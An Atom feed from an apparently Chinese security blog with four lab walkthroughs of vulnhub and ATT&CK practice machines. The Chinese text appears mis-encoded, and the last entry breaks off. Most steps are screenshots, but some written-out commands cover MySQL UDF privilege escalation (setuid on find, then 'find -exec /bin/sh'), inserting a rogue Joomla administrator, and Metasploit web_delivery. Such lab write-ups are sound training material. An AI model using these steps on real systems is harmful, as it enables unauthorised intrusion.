<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Syst1m</title>
  
  
  <link href="https://syst1m.top/atom.xml" rel="self"/>
  
  <link href="https://syst1m.top/"/>
  <updated>2022-08-14T03:24:52.470Z</updated>
  <id>https://syst1m.top/</id>
  
  <author>
    <name>Syst1m</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vulnhub-Raven2æ‰“é¶</title>
    <link href="https://syst1m.top/2022/08/13/vulnhub-Raven2%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/08/13/vulnhub-Raven2%E6%89%93%E9%9D%B6/</id>
    <published>2022-08-13T10:12:55.000Z</published>
    <updated>2022-08-14T03:24:52.470Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>å¯¹é¶æœºè¿›è¡Œç«¯å£æ‰«æ</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131816114.png"></p><p>æ‰«ä¸€ä¸‹ç›®å½•ï¼Œæ‰«åˆ°ä¸€ä¸ªç›®å½•éå†</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131827969.png"></p><p>æ‹¿åˆ°ç¬¬ä¸€ä¸ªflag</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131829833.png"></p><p>æ‰¾åˆ°ç‰ˆæœ¬ä¿¡æ¯ phpmailer5.2.16</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131830372.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="webæ‰“ç‚¹"><a href="#webæ‰“ç‚¹" class="headerlink" title="webæ‰“ç‚¹"></a>webæ‰“ç‚¹</h2><p>æ ¹æ®ç‰ˆæœ¬ä¿¡æ¯æ‰¾ä¸€ä¸‹åˆ©ç”¨æ–‡ä»¶</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131832070.png"></p><p>-m id ä¸‹è½½åˆ°æœ¬åœ°</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131843406.png"></p><p>ä¿®æ”¹è„šæœ¬</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131854768.png"></p><p>å†èµ·ä¸€ä¸ªç»ˆç«¯ç›‘å¬</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131850579.png"></p><p>ä½¿ç”¨pythonè¿è¡Œè„šæœ¬ï¼Œè®¿é—®åé—¨</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131904663.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131904435.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131905706.png"></p><p>ç”¨pyè¿”å›ä¸€ä¸ªåŠäº¤äº’å¼shellï¼Œæ‰¾åˆ°ç¬¬äºŒä¸ªflag</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141044792.png"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>linuxææƒä¸‰æ¿æ–§ï¼Œsuidï¼Œsudoæ— å¯†ç ï¼Œå†…æ ¸çš†æ— æœ</p><p>å°è¯•å…¶ä»–æ–¹å¼ï¼Œçœ‹çœ‹ç½‘ç«™é…ç½®æ–‡ä»¶wp-config.phpï¼Œæ‰¾åˆ°mysqlå¯†ç </p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141048058.png"></p><p>æœ‰mysqlçš„rootè´¦å·æˆ‘ä»¬å¯ä»¥ä½¿ç”¨udfææƒï¼Œä½†æ˜¯éœ€è¦secure_file_privçš„å€¼ä¸ä¸ºnullæˆ–è€…ä¸åšé™åˆ¶</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141052878.png"></p><p>æ²¡æœ‰å¯¼å…¥å¯¼å‡ºé™åˆ¶ï¼ŒæŸ¥çœ‹mysqlç‰ˆæœ¬å’Œä¸»æœºç‰ˆæœ¬ã€æ¶æ„</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141055131.png"></p><p>ä¸‹è½½åˆ©ç”¨æ–‡ä»¶æ¥ææƒ</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141107997.png"></p><p>ç¼–è¯‘ä¸‹è½½å¥½çš„åˆ©ç”¨æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -c 1518.c</span><br><span class="line">gcc -g -shared -Wl,-soname,raptor_udf2.so -o 1.so 1518.o -lc</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141108499.png"></p><p>å†åœ¨kaliç”¨pythonèµ·ä¸€ä¸ªwebæœåŠ¡ï¼Œé¶æœºä¸‹è½½åˆ©ç”¨åˆ°æœ¬åœ°ææƒ</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141112443.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141113459.png"></p><p>è¿›å…¥mysqlï¼Œæ„é€ è‡ªå®šä¹‰å‡½æ•°ï¼Œç»™findä¸€ä¸ªsæƒé™ä¹Ÿå°±æ˜¯suid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(&#x27;/tmp/111.so&#x27;));   //ä¸Šä¼ åˆ°å“ªå°±å†™å“ª</span><br><span class="line">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/111.so&#x27;;   //è¿™ä¸ªå’Œä¸Šä¸€è¡Œä¸æ˜¯ä¸€ä¸ªè·¯å¾„å—·ï¼Œè¦æ ¹æ®å‰é¢è¿›ç¨‹åˆ—å‡ºæ¥çš„pluginç›®å½•è¿›è¡Œæ”¹åŠ¨ï¼ˆä¸€èˆ¬å°±æ˜¯è¿™ä¸ªï¼‰</span><br><span class="line">create function do_system returns integer soname &#x27;111.so&#x27;;     //åˆ›å»º do_system å‡½æ•°è°ƒç”¨</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);     //ç»™findå‘½ä»¤èµ‹äºˆsuidæƒé™</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141120336.png"></p><p>é€€å‡ºmysqlï¼Œåˆ©ç”¨findè¿”å›ä¸€ä¸ªshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> /bin/sh \;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141123993.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;a href=&quot;#ä¿¡æ¯æ”¶é›†&quot; class=&quot;headerlink&quot; title=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;/a&gt;ä¿¡æ¯æ”¶é›†&lt;/h1&gt;&lt;p&gt;å¯¹é¶æœºè¿›è¡Œç«¯å£æ‰«æ&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202208131816114.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;æ‰«ä¸€ä¸‹ç›®å½•ï¼Œæ‰«åˆ°ä¸€ä¸ªç›®å½•éå†&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202208131827969.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="æ‰“é¶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="udfææƒ" scheme="https://syst1m.top/tags/udf%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>vuln-Momentum2æ‰“é¶</title>
    <link href="https://syst1m.top/2022/07/27/vulnhub-Momentum2%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/07/27/vulnhub-Momentum2%E6%89%93%E9%9D%B6/</id>
    <published>2022-07-27T13:47:49.000Z</published>
    <updated>2022-07-27T16:21:41.520Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><table><thead><tr><th>æ”»å‡»æœº</th><th>é¶æœº</th></tr></thead><tbody><tr><td>172.16.17.140</td><td>172.16.17.158</td></tr></tbody></table><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>å¯¹é¶æœºè¿›è¡Œæ‰«æ</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272220840.png"></p><p>å¼€æ”¾22,80ç«¯å£ï¼Œè®¿é—®webæœåŠ¡æ²¡æœ‰åŠŸèƒ½ç‚¹ï¼Œç»§ç»­æ‰«ç›®å½•</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272225529.png"></p><p>è®¿é—®&#x2F;jså­˜åœ¨å­˜åœ¨ä¸€ä¸ªjsæ–‡ä»¶</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272228711.png" style="zoom:50%;" /><p>dashboard.htmlæ˜¯ä¸€ä¸ªä¸Šä¼ é¡µé¢</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272230972.png"></p><p>ajax.phpæ— ä»»ä½•å›æ˜¾</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272232356.png"></p><p>ç»“åˆä¸Šé¢çš„ä¿¡æ¯çŸ¥é“æ˜¯ä¸€ä¸ªä¸Šä¼ è„šæœ¬ï¼Œåç«¯ç”±ajax.phpå»å¤„ç†</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="ä¸Šä¼ ç»•è¿‡"><a href="#ä¸Šä¼ ç»•è¿‡" class="headerlink" title="ä¸Šä¼ ç»•è¿‡"></a>ä¸Šä¼ ç»•è¿‡</h2><p>å°è¯•ä¸Šä¼ shellï¼Œè¢«è¿‡æ»¤</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272244313.png"></p><p>ç»§ç»­fuzz,å‘ç°åç¼€ä¸ºtxtçš„ä¸Šä¼ æˆåŠŸ</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272245618.png"></p><p>ä½†æ˜¯æ²¡æœ‰è¿”å›ä¸Šä¼ è·¯å¾„ï¼Œæ¢ä¸ªå­—å…¸ç»§ç»­ï¼Œæ‰«å‡ºäº†ä¸Šä¼ è·¯å¾„å’Œä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ajax.php.bak</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272305974.png"></p><p>æŸ¥çœ‹å¤‡ä»½æ–‡ä»¶ï¼Œå½“cookieä¸ºå­—æ®µadmin&#x3D;&amp;G6u@B6uDXMq&amp;Msæ—¶å¯ä»¥ä¸Šä¼ php,è¿˜æç¤ºéœ€è¦åœ¨cookieæœ«å°¾æ·»åŠ ä¸€ä¸ªå¤§å†™å­—æ¯ï¼ŒåŒæ—¶postå­—æ®µsecureçš„å€¼ä¸ºval1d</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272307017.png"></p><p>burpå‘åŒ…å¼€å§‹çˆ†ç ´</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272359360.png"></p><p>å½“æœ€åä¸€ä½å¤§å†™å­—æ¯ä¸ºRçš„æ—¶å€™ï¼Œä¸Šä¼ æˆåŠŸ,æ‹¿åˆ°ç¬¬ä¸€ä¸ªflag</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280005485.png"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ç»§ç»­å¾€ä¸‹ï¼Œç¿»åˆ°ä¸€ä¸ªå¯†ç </p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280006415.png"></p><p>sshä¸Šå»æ‹¿åˆ°ä¸€ä¸ªå®Œæ•´çš„shellï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå°å‘ï¼Œ[]é‡Œçš„å•è¯æ˜¯*çš„æ„æ€ï¼Œåœ¨å¯†ç appåé¢åŠ ä¸ª * å³å¯</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280010238.png"></p><p>linuxææƒä¸‰æ¿æ–§ï¼Œsuidï¼Œsudoæ— å¯†ç ï¼Œå†…æ ¸</p><p>æ‰¾åˆ°ä¸€ä¸ªrootæƒé™æ— å¯†ç çš„pyæ–‡ä»¶</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280015799.png"></p><p>æ¥å—è¾“å…¥ï¼Œæ‰§è¡Œå‘½ä»¤å»äº§ç”Ÿcookieå¹¶è¾“å‡ºï¼Œæ²¡æœ‰è¿‡æ»¤å­˜åœ¨rce</p><p>kalièµ·ä¸€ä¸ªç›‘å¬ï¼Œç„¶åæ‰§è¡Œ</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280020452.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280020643.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒ&quot;&gt;&lt;/a&gt;ç¯å¢ƒ&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;æ”»å‡»æœº&lt;/th&gt;
&lt;th&gt;é¶æœº&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;172.16.17.140&lt;/td&gt;
&lt;td&gt;172.16.17.158&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h1 id=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;a href=&quot;#ä¿¡æ¯æ”¶é›†&quot; class=&quot;headerlink&quot; title=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;/a&gt;ä¿¡æ¯æ”¶é›†&lt;/h1&gt;&lt;p&gt;å¯¹é¶æœºè¿›è¡Œæ‰«æ&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202207272220840.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="æ‰“é¶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-MOMENTUM:1æ‰“é¶</title>
    <link href="https://syst1m.top/2022/07/26/vulnhub-MOMENTUM-1%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/07/26/vulnhub-MOMENTUM-1%E6%89%93%E9%9D%B6/</id>
    <published>2022-07-26T14:32:24.000Z</published>
    <updated>2022-07-27T13:48:39.127Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><table><thead><tr><th>æ”»å‡»æœº</th><th>é¶æœº</th></tr></thead><tbody><tr><td>172.16.17.140</td><td>172.16.17.157</td></tr></tbody></table><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>å¯¹é¶æœºè¿›è¡Œç«¯å£æ‰«æ</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207262304123.png"></p><p>åªå¼€äº†ä¸¤ä¸ªç«¯å£22,80ï¼Œå…ˆæ‰«ä¸€ä¸‹ç›®å½•ï¼Œæ‰«åˆ°ä¸€ä¸ªjsç›®å½•ï¼Œæ‰“å¼€å‘ç°ä¸€ä¸ªjsæ–‡ä»¶</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207262323200.png"></p><p>å‘ç°AESç§˜é’¥å’Œä¸€ä¸ªè¿æ¥</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207262326894.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>è®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œå‘ç°è¾“å…¥ä»€ä¹ˆéƒ½ä¼šåœ¨é¡µé¢å›æ˜¾å‡ºæ¥</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207262344102.png"></p><p>é‚£ä¹ˆåº”è¯¥å­˜åœ¨xssæ¼æ´ï¼Œç»“åˆä¸Šé¢ç»™å‡ºçš„aesç§˜é’¥ï¼Œå¼¹ä¸ªcookieçœ‹çœ‹</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207262351634.png"></p><p>AESè§£å¯†å‡ºå¯†æ–‡æ˜¯ä¸€ä¸ªè´¦å·å¯†ç </p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207262353466.png"></p><p>auxerre&#x2F;auxerre-alienum## å°è¯•ç™»å½•ssh</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207262355496.png"></p><p>æ‹¿åˆ°ç¬¬ä¸€ä¸ªflag</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207270015731.png"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><h2 id="redisæœªæˆæƒè®¿é—®"><a href="#redisæœªæˆæƒè®¿é—®" class="headerlink" title="redisæœªæˆæƒè®¿é—®"></a>redisæœªæˆæƒè®¿é—®</h2><p>å°è¯•äº†suidï¼Œsudoæ— å¯†ç çš†æ— æœï¼Œåœ¨æŸ¥çœ‹è¿›ç¨‹çš„æ—¶å€™å‘ç°äº†redisæœåŠ¡</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207270019758.png"></p><p>å°è¯•æ— å¯†ç ç™»å½•æˆåŠŸ</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207270022112.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒ&quot;&gt;&lt;/a&gt;ç¯å¢ƒ&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;æ”»å‡»æœº&lt;/th&gt;
&lt;th&gt;é¶æœº&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;172.16.17.140&lt;/td&gt;
&lt;td&gt;172.16.17.157&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h1 id=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;a href=&quot;#ä¿¡æ¯æ”¶é›†&quot; class=&quot;headerlink&quot; title=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;/a&gt;ä¿¡æ¯æ”¶é›†&lt;/h1&gt;&lt;p&gt;å¯¹é¶æœºè¿›è¡Œç«¯å£æ‰«æ&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202207262304123.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="æ‰“é¶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="redis" scheme="https://syst1m.top/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>ATT&amp;CKçº¢é˜Ÿå®æˆ˜é¶åœº03</title>
    <link href="https://syst1m.top/2022/07/23/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA03/"/>
    <id>https://syst1m.top/2022/07/23/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA03/</id>
    <published>2022-07-23T06:41:46.000Z</published>
    <updated>2022-07-23T19:12:42.335Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h1><p>æœ¬æ¬¡æµ‹è¯•ä¸ºé»‘ç›’æµ‹è¯•ï¼Œæ‰€ä»¥æ‰€æœ‰ä¸»æœºéƒ½ä¸ºæŒ‚èµ·çŠ¶æ€ï¼Œä¸”è´¦å·éƒ½é»˜è®¤å·²ç»ç™»å½•</p><p>å·²çŸ¥å‡ºç½‘ä¸»æœºä¸ºcentosä¸»æœº</p><p>å°†centoså‡ºç½‘ç½‘å¡å’Œkaliæ”»å‡»æœºç½‘å¡éƒ½è®¾ç½®ä¸ºæ¡¥æ¥å¤åˆ¶ç‰©ç†ç½‘ç»œæ¨¡å¼</p><p>å…¶å®ƒç½‘å¡éƒ½é»˜è®¤vmnet2æ¨¡å¼ï¼Œæ·»åŠ vmnet2ç½‘å¡</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231503267.png"></p><p>å¼€å¯centosåéœ€è¦é‡æ–°è·å–ä¸€æ¬¡ip eth0ç½‘å¡ä¸ºæˆ‘ä»¬å¤åˆ¶çš„ç‰©ç†ç½‘ç»œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dhclient -r</span><br><span class="line">dhclient</span><br></pre></td></tr></table></figure><h1 id="æ‹“æ‰‘å›¾"><a href="#æ‹“æ‰‘å›¾" class="headerlink" title="æ‹“æ‰‘å›¾"></a>æ‹“æ‰‘å›¾</h1><p>ipæœ‰å‡ºå…¥</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191223205755-d65c291e-2583-1.png" alt="img"></p><h1 id="å¤–ç½‘æ‰“ç‚¹"><a href="#å¤–ç½‘æ‰“ç‚¹" class="headerlink" title="å¤–ç½‘æ‰“ç‚¹"></a>å¤–ç½‘æ‰“ç‚¹</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>nmapç¡®å®šç›®æ ‡ip</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231506534.png" style="zoom:50%;" /><p>è¿›ä¸€æ­¥æ‰«æç«¯å£</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231508278.png"></p><p>ç›®æ ‡ä¸ºubuntu16.04.1</p><p>22ç«¯å£å­˜åœ¨sshï¼Œå¯ä»¥çˆ†ç ´</p><p>80ç«¯å£webæœåŠ¡</p><p>3306ç«¯å£mysqlæ•°æ®åº“ï¼Œå¯ä»¥çˆ†ç ´</p><h2 id="webæ‰“ç‚¹"><a href="#webæ‰“ç‚¹" class="headerlink" title="webæ‰“ç‚¹"></a>webæ‰“ç‚¹</h2><p>è®¿é—®ç½‘ç«™ï¼Œç”¨æ’ä»¶å¾—åˆ°cmsä¿¡æ¯ nginx+php+joomla</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231540227.png"></p><p>ä½¿ç”¨joomscanå·¥å…·æ‰«æï¼Œæ²¡æœ‰æ¼æ´ä½†æ˜¯çŸ¥é“äº†ç‰ˆæœ¬ä¸º3.9.12</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u http://192.168.31.54</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231553270.png"></p><p>æ‰«å‡ºäº†åå°å’Œä¸€ä¸ªé…ç½®æ–‡ä»¶</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231602861.png"></p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231604877.png" style="zoom:50%;" /><p>å¾—åˆ°mysqlå¯†ç å’Œç»å¯¹è·¯å¾„</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231605901.png" style="zoom:50%;" /><p>è¿æ¥æ•°æ®åº“</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231612220.png"></p><p>æ‹¿åˆ°å¯†ç å¯†æ–‡ï¼Œè§£ä¸å‡ºæ¥</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231622756.png"></p><p>æŸ¥é˜…å®˜æ–¹æ–‡æ¡£å‘ç°å¯ä»¥æ·»åŠ ä¸€ä¸ªç®¡ç†å‘˜è´¦å· <a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO am2zu_users (name, username, password, params, registerDate, lastvisitDate, lastResetTime) VALUES (&#x27;Administrator2&#x27;, &#x27;admin123&#x27;, &#x27;433903e0a9d6a712e00251e44d29bf87:UJ0b9J5fufL3FKfCc0TLsYJBh2PFULvT&#x27;, &#x27;&#x27;, NOW(), NOW(), NOW()); INSERT INTO am2zu_user_usergroup_map (user_id,group_id) VALUES (LAST_INSERT_ID(),&#x27;8&#x27;);</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œsqlè¯­å¥æ·»åŠ è´¦å·å¯†ç admin123&#x2F;admin</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231623633.png"></p><p>ç™»å½•åå°åæ·»åŠ .phpåç¼€ç™½åå•</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231627384.png"></p><p>åœ¨åœ¨Extensions -&gt; Templates -&gt; Templateså¯ä»¥ç¼–è¾‘æ¨¡æ¿æ–‡ä»¶</p><p>åˆ›å»ºä¸€ä¸ªæ–°çš„phpæ–‡ä»¶ç”¨æ¥å†™é©¬</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231633717.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231635473.png"></p><p>ä½¿ç”¨èšå‰‘è¿æ¥éœ€è¦æ³¨æ„å…³é—­èšå‰‘çš„ä»£ç†</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231709238.png"></p><p>æ— æ³•æ‰§è¡Œå‘½ä»¤</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231715213.png"></p><p>å‘ç°disbale_funcionsç¦ç”¨äº†å‡½æ•°</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231716993.png"></p><p>é€šè¿‡èšå‰‘æ’ä»¶å»ç»•è¿‡</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231717581.png"></p><p>æŸ¥çœ‹ipï¼Œå‘ç°ä¸å¯¹åŠ²ï¼Œæˆ‘ä»¬è®¿é—®çš„ipæ˜æ˜æ˜¯192.168.31.54ï¼Œæ€ä¹ˆè¿™é‡Œæ˜¯192.168.93.120ï¼Œåº”è¯¥æ˜¯ä½¿ç”¨äº†nginxåå‘ä»£ç†</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231722236.png"></p><p>ä¸Šçº¿åˆ°msfä¸Šåšä¸€ä¸ªå†…ç½‘æ‰«æï¼Œä½¿ç”¨ä¼ ç»Ÿçš„ç”Ÿäº§åé—¨å†ä¸Šä¼ å¤ªéº»çƒ¦äº†ï¼Œè¿™é‡Œä½¿ç”¨msfæœ¬åœ°èµ·ä¸€ä¸ªåé—¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br></pre></td></tr></table></figure><p>è®¾ç½®ç›®æ ‡ä¸ºlinux</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231735159.png"></p><p>ç„¶åå°†ç”Ÿæˆçš„å‘½ä»¤å¤åˆ¶åˆ°shellä¸­æ‰§è¡Œ</p><p><img 